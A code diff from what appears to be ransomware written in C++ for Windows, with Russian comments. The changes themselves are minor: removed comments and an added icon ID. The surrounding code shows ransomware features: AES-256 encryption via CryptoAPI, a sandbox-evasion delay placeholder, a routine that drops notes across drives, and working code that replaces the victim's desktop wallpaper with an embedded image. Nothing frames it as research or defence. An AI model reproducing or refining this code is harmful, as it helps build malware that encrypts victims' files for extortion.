@@ -38,9 +38,10 @@
 #define SANDBOX_DELAY_ENABLED_PLACEHOLDER 0
 
 // ============================================================
-// РЕСУРСЫ — КАРТИНКА ОБОЕВ ВШИТА В EXE
+// ID РЕСУРСОВ
 // ============================================================
 #define IDB_WALLPAPER 101
+#define IDI_ICON 100
 
 // ============================================================
 // AES-256-CBC (Windows CryptoAPI) — РАБОТАЕТ НА WINLATOR
@@ -187,7 +188,6 @@ std::vector<std::string> split_string(const std::string& str, char delimiter) {
 // УСТАНОВКА ОБОЕВ ИЗ РЕСУРСОВ
 // ============================================================
 void set_wallpaper_from_resource() {
-    // Получаем ресурс (картинку)
     HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "IMAGE");
     if (!hRes) return;
     
@@ -198,7 +198,6 @@ void set_wallpaper_from_resource() {
     BYTE* data = (BYTE*)LockResource(hData);
     if (!data || size == 0) return;
     
-    // Сохраняем во временную папку
     char temp_path[MAX_PATH];
     GetTempPathA(MAX_PATH, temp_path);
     std::string wall_path = std::string(temp_path) + "wall.jpg";
@@ -211,7 +210,6 @@ void set_wallpaper_from_resource() {
         return;
     }
     
-    // Устанавливаем обои
     SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
 }
 
@@ -429,7 +427,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::string note_content = NOTE_CONTENT_PLACEHOLDER;
     drop_notes(drives, exclude_folders, note_name, note_content);
     
-    // Установка обоев из ресурсов
     set_wallpaper_from_resource();
     
     return 0;
